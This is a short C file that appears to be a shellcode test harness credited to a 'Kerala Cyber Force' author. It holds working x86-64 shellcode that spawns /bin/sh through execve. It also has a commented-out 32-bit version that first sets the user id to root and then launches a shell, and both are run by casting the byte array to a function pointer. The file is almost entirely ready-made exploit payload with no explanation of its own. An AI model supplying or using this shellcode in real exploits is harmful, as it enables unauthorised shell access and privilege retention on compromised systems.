/*shellprogram.c
the commented out lines were used as a prototype for my shellcode
I needed x86-64 64 bit IA shellcode while the commented out code is x86 i.e. 32 bit IA
Kerala Cyber Force 
–
Ajin Abraham */
/*
char
code[] = 
"\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";
int main(int argc, char **argv)
{
int (*exeshell)();
exeshell = (int (*)()) code;
(int)(*exeshell)();
}
*/
#include <stdio.h>
char sh[]="\xeb\x0b\x5f\x48\x31\xd2\x52\x5e\x6a\x3b\x58\x0f\x05\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";
void main(int argc, char **argv)
{
    int (*func)();
    func = (int (*)()) sh;
    (int)(*func)();
}